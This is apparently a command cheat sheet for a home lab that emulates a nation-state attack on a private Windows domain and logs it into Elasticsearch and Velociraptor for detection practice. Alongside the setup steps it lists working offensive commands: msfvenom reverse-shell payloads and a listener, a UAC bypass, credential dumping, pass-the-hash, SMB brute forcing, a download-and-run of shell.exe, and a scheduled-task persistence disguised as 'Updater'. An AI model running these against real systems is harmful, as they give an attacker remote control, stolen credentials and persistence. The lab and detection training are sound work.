# Commands Reference – Nation-State Lab

This document lists all essential commands used during the lab, organised by category. It serves as a quick reference for replication and troubleshooting.

---

## 1. Kali Linux (Attacker VM)

### 1.1 System & Network

```bash
# Set static IP (edit /etc/network/interfaces)
auto eth0
iface eth0 inet static
    address 192.168.1.5
    netmask 255.255.255.0
    gateway 192.168.1.1

# Verify IP
ip a

# Test connectivity to Elasticsearch
curl http://192.168.1.100:9200
```

---

## 1.2 Metasploit

```bash
# Install
sudo apt install metasploit-framework -y

# Initialise database
sudo msfdb init

# Start console
sudo msfconsole -q

# Generate reverse shell payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o /tmp/shell.exe
```

### Listener

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
set ExitOnSession false
exploit -j
```

### UAC Bypass

```text
use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4445
run
```

### Credential Dumping

```text
load kiwi
creds_all
```

### HTTP Beacon

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.1.5 LPORT=8080 -f exe -o /tmp/beacon.exe
```

---

## 1.3 Impacket

```bash
sudo apt install impacket-scripts -y

# Pass-the-hash
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 nation/administrator@192.168.1.10

# Secretsdump
impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 nation/administrator@192.168.1.10
```

---

## 1.4 Caldera

```bash
git clone -b v4.14.5 https://github.com/mitre/caldera.git --recursive
cd caldera
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

python3 server.py --insecure
```

---

## 1.5 BloodHound CE (Docker)

```bash
docker run -d --name bloodhound -p 8080:8080 -p 7474:7474 specterops/bloodhound:latest
```

---

## 1.6 Filebeat

```bash
sudo apt install filebeat -y

sudo nano /etc/filebeat/filebeat.yml
```

```yaml
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - /var/log/syslog
    - /var/log/auth.log

output.elasticsearch:
  hosts: ["http://192.168.1.100:9200"]
```

```bash
sudo systemctl enable --now filebeat
```

---

## 1.7 Other Tools

```bash
nmap -sV -O 192.168.1.0/24

hydra -l normaluser -P /usr/share/wordlists/rockyou.txt smb://192.168.1.10

sudo responder -I eth0 -dw
```

---

## 2. Windows VMs

### 2.1 Network Setup

```cmd
netsh interface ip set address "Ethernet0" static 192.168.1.20 255.255.255.0
```

---

### 2.2 Domain Join

```text
nation.local
nation\Administrator / Windows_DC_Admin123!
```

---

### 2.3 Audit Policy

```cmd
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /get /subcategory:"Logon"
```

---

### 2.4 Winlogbeat

```cmd
msiexec /i winlogbeat.msi TARGETDIR="C:\Winlogbeat" /qn
```

---

### 2.5 Payload Execution

```powershell
Invoke-WebRequest -Uri "http://192.168.1.5:8080/shell.exe" -OutFile "C:\Users\Public\shell.exe"
```

```cmd
C:\Users\Public\shell.exe
```

---

### 2.6 Persistence

```cmd
schtasks /create /tn "Updater" /tr "C:\Users\Public\shell.exe" /sc daily /st 09:00 /f
```

---

### 2.7 Firewall

```cmd
netsh advfirewall set allprofiles state off
netsh advfirewall set allprofiles state on
```

---

## 3. Elasticsearch + Kibana Host

### 3.1 Docker Setup

```bash
docker run -d --name elasticsearch --network elastic -p 9200:9200 \
-e "discovery.type=single-node" \
-e "xpack.security.enabled=false" \
docker.elastic.co/elasticsearch/elasticsearch:8.14.0
```

```bash
docker run -d --name kibana --network elastic -p 5601:5601 \
-e "ELASTICSEARCH_HOSTS=http://elasticsearch:9200" \
docker.elastic.co/kibana/kibana:8.14.0
```

---

### 3.2 Velociraptor

```bash
./velociraptor config generate -i
sudo systemctl enable --now velociraptor-server
```

---

### 3.3 Firewall Rules

```bash
sudo ufw allow 9200/tcp
sudo ufw allow 5601/tcp
sudo ufw allow 8889/tcp
sudo ufw enable
```

---

### 3.4 Elasticsearch Queries

```bash
curl http://192.168.1.100:9200/_cat/indices?v

curl http://192.168.1.100:9200/_cluster/health?pretty
```

---

## 4. File Transfer

### Windows

```cmd
copy "\\vmware-host\Shared Folders\share\file.msi" C:\Temp\
```

---

### Kali

```bash
sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other
```

---

## 5. Kibana

**URL:**  
http://192.168.1.100:5601

**Index Patterns:**
- winlogbeat-*
- filebeat-*

---

## 6. Troubleshooting

| Issue | Command |
|------|--------|
| Docker status | docker ps -a |
| Logs | docker logs <container> |
| Elasticsearch test | curl localhost:9200 |
| Winlogbeat status | sc query winlogbeat |
| Restart service | net stop winlogbeat && net start winlogbeat |
| Network test | Test-NetConnection 192.168.1.100 -Port 9200 |
| Disk check Linux | df -h |
| Disk check Windows | fsutil volume diskfree C: |
| Filebeat logs | journalctl -u filebeat -f |
| Velociraptor logs | journalctl -u velociraptor-server -f |